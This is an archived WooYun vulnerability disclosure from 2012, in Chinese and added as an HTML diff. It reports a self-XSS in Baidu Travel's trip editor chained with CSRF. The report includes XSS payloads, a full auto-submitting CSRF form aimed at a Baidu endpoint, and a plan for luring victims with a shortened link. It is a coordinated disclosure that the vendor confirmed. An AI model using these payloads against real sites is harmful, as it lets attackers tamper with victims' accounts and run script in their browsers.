@@ -1,0 +1,221 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		用CSRF利用百度旅游中的YY型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		用CSRF利用百度旅游中的YY型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/P1n9y_fly">P1n9y_fly</a> 
+</li><li>提交时间：		2012-07-25 21:54</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-07-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-08-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-08-15：	细节向普通白帽子公开<br/>
+									2012-08-25：	细节向实习白帽子公开<br/>
+									2012-09-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">用CSRF利用YY型XSS一处……囧……</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">是在旅游中 旅程 的编辑中YY的<br />
+<br />
+<br />
+<br />
+作为一名新的web安全爱好者新手，看书之余，每天四处逛网站复制粘贴是必备的，发现有很多的XSS都是只能XSS自己，感觉很郁闷比如下面这一个百度旅游的。<br />
+<br />
+</p><p class="detail"><a href="../images/25210955d8e94a523c4c31b816062abc1a587d1e.jpg" target="_blank"><img src="../images/25210955d8e94a523c4c31b816062abc1a587d1e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+在创建新的旅程的时候，将“旅程描述”这一栏设为<br />
+<br />
+&quot;/&gt;&lt;IFRAME SRC=http://www.qq.com onload=alert(1898)&gt;&lt;/IFRAME&gt;后，到浏览页面下查看发现已经被过滤了<br />
+<br />
+</p><p class="detail"><a href="../images/252110228167a82dabb1a39b9d73957c72cbe39b.png" target="_blank"><img src="../images/252110228167a82dabb1a39b9d73957c72cbe39b.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+ 但是在点击编辑之后，成功的弹出了如上窗口，查看源代码发现是desc木有过滤，导致出现了这个YY型的XSS。<br />
+<br />
+</p><p class="detail"><a href="../images/25211108da2e259a30baf70e97886230cb2976a8.jpg" target="_blank"><img src="../images/25211108da2e259a30baf70e97886230cb2976a8.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+如何利用这个YY型XSS呢。<br />
+<br />
+在编辑提交之后我用Fiddler抓到了这样一个包：<br />
+<br />
+</p><p class="detail"><a href="../images/2521112103afaac904241669320f20ca6e03869a.png" target="_blank"><img src="../images/2521112103afaac904241669320f20ca6e03869a.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+木有token，除了最后一个是什么意思不明白其他还好说，我们到浏览页面源代码中搜索最下面的两个值，发现一个是trnid的值一个是sid的值，都是可以查到的，那么我就构建了一个表单：<br />
+<br />
+</p><pre><code>&lt;head&gt;<br />
+&lt;meta charset=&quot;GB2312&quot;/&gt;<br />
+&lt;title&gt;test&lt;/title&gt;<br />
+&lt;/head&gt;<br />
+&lt;form method=&quot;post&quot; action=&quot;http://lvyou.baidu.com/footprint/trip/post/editsave&quot; target=&quot;_self&quot;&gt;<br />
+	&lt;input name=&quot;start_time&quot; value=&#039;1999-03-01&#039;&gt;<br />
+	&lt;input name=&quot;time&quot; value=&quot;102&quot;&gt;<br />
+	&lt;input name=&quot;time_unit&quot; value=&quot;d&quot;&gt;<br />
+	&lt;input name=&quot;departure&quot; value=&quot;&quot;&gt;<br />
+	&lt;input name=&quot;departure_sid&quot; value=&quot;1fdbf740851f3e07d8d23ff7&quot;&gt;<br />
+	&lt;input name=&quot;desc&quot; value=&quot; &quot;&gt;<br />
+	&lt;input name=&quot;zoom&quot; value=&quot;5&quot;&gt;<br />
+	&lt;input name=&quot;trid&quot; value=&quot;af3142e1dfcadf25f3208251&quot;&gt;<br />
+	&lt;input name=&quot;node_array[]&quot; value=&quot;68be7ae3b9d414ff762fdd82,e1b1b2be2306a40f9b9d32db&quot;&gt;<br />
+	&lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;submit&quot; onclick=submit()/&gt;<br />
+&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+将desc的值设为&quot;/&gt;&lt;script/defer&gt;alert(1898)&lt;/script&gt;并修改其他值，点击提交之后发现旅程描述变了。<br />
+<br />
+</p><p class="detail"><a href="../images/252112479a8a04a74b007e4e437ac7fc2623cf0f.jpg" target="_blank"><img src="../images/252112479a8a04a74b007e4e437ac7fc2623cf0f.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+然后点开编辑发现成功弹窗<br />
+<br />
+</p><p class="detail"><a href="../images/252112598a80269cf685b4698e7a52fc8a85fdd1.png" target="_blank"><img src="../images/252112598a80269cf685b4698e7a52fc8a85fdd1.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+我们试想一下，我们找到一篇旅程，查看到他的各项参数，比如trid，nid等等，然后构造一个POST表单放入sinaapp中，设置成短网址后给这个人发一条评论，他点了之后自动提交表单，他的旅程描述就被改为了恶意代码，之后他发现不对，点击编辑改回去，恶意代码就执行了。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">这个不好证明。。其实很好自测的吧。。<br />
+<br />
+http://lvyou.baidu.com/user/trip/66a1950cff3325d7323ccbfb </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.弄掉CSRF<br />
+<br />
+2.弄掉YY型XSS。。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/P1n9y_fly" title="P1n9y_fly">P1n9y_fly</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-010148" title="用CSRF利用百度旅游中的YY型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2012-07-26 10:21</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">思路不错，感谢你对百度安全的关注，我们尽快修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="10148";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
